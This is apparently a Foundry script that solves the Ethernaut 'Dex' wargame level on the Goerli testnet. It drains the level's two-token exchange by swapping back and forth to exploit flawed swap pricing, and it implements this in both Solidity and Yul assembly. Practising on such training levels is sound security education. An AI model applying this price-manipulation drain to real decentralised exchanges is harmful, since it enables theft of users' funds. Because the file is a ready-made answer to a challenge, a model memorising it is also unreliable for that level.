// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function owner() external view returns (address);

    function token1() external view returns (address);

    function token2() external view returns (address);

    function getSwapPrice(address from, address to, uint amount) external view returns (uint);

    function balanceOf(address token, address account) external view returns (uint);

    function approve(address spender, uint amount) external;

    function swap(address from, address to, uint amount) external;
}

contract DexScript is EthernautScript {
    string network = "goerli";
    address level = 0x9CB391dbcD447E645D6Cb55dE6ca23164130D008;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        instance.approve(address(instance), 1000);

        IERC20 fromToken = IERC20(instance.token2());
        IERC20 toToken = IERC20(instance.token1());

        toToken.transfer(address(instance), 10);

        while (fromToken.balanceOf(address(instance)) > 0 && toToken.balanceOf(address(instance)) > 0) {
            uint256 amount = fromToken.balanceOf(player);
            if (amount > fromToken.balanceOf(address(instance))) {
                amount = fromToken.balanceOf(address(instance));
            }

            instance.swap(address(fromToken), address(toToken), amount);

            IERC20 _toToken = fromToken;
            fromToken = toToken;
            toToken = _toToken;
        }
    }

    function yulVersion() internal {
        assembly {
            //  we'll have to call `balanceOf` a lot, so let's write a function for it
            function balanceOf(token, addr) -> bal {
                mstore(0, "balanceOf(address)")
                mstore(0, keccak256(0, 18))
                mstore(4, addr)
                pop(staticcall(gas(), token, 0, 0x24, 0, 32))
                bal := mload(0)
            }

            let _instance := sload(instance.slot)

            let fmp := mload(0x40)

            mstore(fmp, "approve(address,uint256)")
            mstore(fmp, keccak256(fmp, 24))
            mstore(add(fmp, 4), _instance)
            mstore(add(fmp, 0x24), 1000)
            let success := call(gas(), _instance, 0, fmp, 0x44, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "token1()")
            mstore(0, keccak256(0, 8))
            pop(staticcall(gas(), _instance, 0, 4, 0, 32))
            let toToken := mload(0)

            mstore(0, "token2()")
            mstore(0, keccak256(0, 8))
            pop(staticcall(gas(), _instance, 0, 4, 0, 32))
            let fromToken := mload(0)

            mstore(fmp, "transfer(address,uint256)")
            mstore(fmp, keccak256(fmp, 25))
            mstore(add(fmp, 4), _instance)
            mstore(add(fmp, 0x24), 10)
            success := call(gas(), toToken, 0, fmp, 0x44, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            for {

            } and(gt(balanceOf(fromToken, _instance), 0), gt(balanceOf(toToken, _instance), 0)) {

            } {
                let amount := balanceOf(fromToken, sload(player.slot))
                if gt(amount, balanceOf(fromToken, _instance)) {
                    amount := balanceOf(fromToken, _instance)
                }

                mstore(fmp, "swap(address,address,uint256)")
                mstore(fmp, keccak256(fmp, 29))
                mstore(add(fmp, 4), fromToken)
                mstore(add(fmp, 0x24), toToken)
                mstore(add(fmp, 0x44), amount)
                success := call(gas(), _instance, 0, fmp, 0x64, 0, 0)
                if iszero(success) {
                    revert(0, 0)
                }

                let _toToken := fromToken
                fromToken := toToken
                toToken := _toToken
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
